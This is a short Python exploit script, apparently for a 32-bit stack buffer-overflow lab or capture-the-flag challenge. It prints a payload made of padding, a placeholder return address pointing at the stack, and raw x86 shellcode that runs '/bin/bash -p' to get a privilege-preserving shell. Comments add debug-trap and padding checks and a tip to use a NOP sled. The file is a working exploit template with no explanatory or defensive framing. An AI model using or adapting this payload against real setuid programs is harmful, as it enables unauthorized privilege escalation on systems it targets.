import struct

#padding_check="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
padding="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"

eip=(address of stack pointer) #put the address of the stack pointer it varies depending on the environment variables and other factor if u can't able execute code try NOP instructions

#debug_mode="\xcc"*4
shell_code="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

#checking the padding
#print(padding_check)

#debug_mode check
#print(padding+eip+debug_mode)

#shell code execution
print(padding+eip+shell_code)
